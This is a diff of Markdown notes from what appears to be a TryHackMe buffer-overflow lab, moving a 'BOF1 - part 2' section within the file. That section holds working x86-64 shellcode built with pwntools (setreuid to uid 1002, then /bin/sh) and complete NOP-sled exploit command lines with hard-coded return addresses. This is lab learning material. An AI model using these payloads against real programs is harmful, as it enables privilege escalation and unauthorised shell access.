@@ -828,30 +828,7 @@ p/x $rax # $1 = 0x7fffffffe380
 i f # ... rip at 0x7fffffffe418
 ```
 
-##### Generate the payload with pwn and shellcraft
-
-The payload will conist of two parts:
-1. Set the uid to user2 (1002)
-2. Load a shell
-
-```
-from pwn import *
-context.clear(arch='amd64')
-asm(shellcraft.setreuid(1002))
-python3 -c 'print("1\xfff\xbf\xea\x03jqXH\x89\xfe\x0f\x05", end="")' | xxd -ps
-```
-
-This will give you the following output `31c3bf66c2bfc3aa036a715848c289c3be0f05` that you need to turn into `\x..` format. You can use Notepad++ for that e.g.
-
-Shell code will be: `6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05`.
-
-##### local
-./buffer-overflow $(python -c 'print "\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 45 + "\xc0\xe4\xff\xff\xff\x7f"')
-
-##### THM server
-./buffer-overflow $(python -c 'print("\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 45 + "\xa8\xe7\xff\xff\xff\x7f")')
-
-./buffer-overflow $(python -c 'print("\x90" * 60 + "\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05" + "\x90" * 30 + "\xa8\xe7\xff\xff\xff\x7f")')
+### Day 8 - Try harder
 
 #### CrackMe
 Source file: [crackme](https://myexperiments.io/exploit-basic-buffer-overflow.html)
@@ -880,3 +857,30 @@ setarch `uname -m` -R /bin/bash
 `���1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAA`
 
 Interesting additional resource [Slide 51](https://exploit.courses/files/bfh2017/day3/0x42_Exploit.pdf).
+
+#### BOF1 - part 2
+
+##### Generate the payload with pwn and shellcraft
+
+The payload will conist of two parts:
+1. Set the uid to user2 (1002)
+2. Load a shell
+
+```
+from pwn import *
+context.clear(arch='amd64')
+asm(shellcraft.setreuid(1002))
+python3 -c 'print("1\xfff\xbf\xea\x03jqXH\x89\xfe\x0f\x05", end="")' | xxd -ps
+```
+
+This will give you the following output `31c3bf66c2bfc3aa036a715848c289c3be0f05` that you need to turn into `\x..` format. You can use Notepad++ for that e.g.
+
+Shell code will be: `6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05`.
+
+##### local
+./buffer-overflow $(python -c 'print "\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 45 + "\xc0\xe4\xff\xff\xff\x7f"')
+
+##### THM server
+./buffer-overflow $(python -c 'print("\x90" * 80 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90" * 45 + "\xa8\xe7\xff\xff\xff\x7f")')
+
+./buffer-overflow $(python -c 'print("\x90" * 60 + "\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05" + "\x90" * 30 + "\xa8\xe7\xff\xff\xff\x7f")')
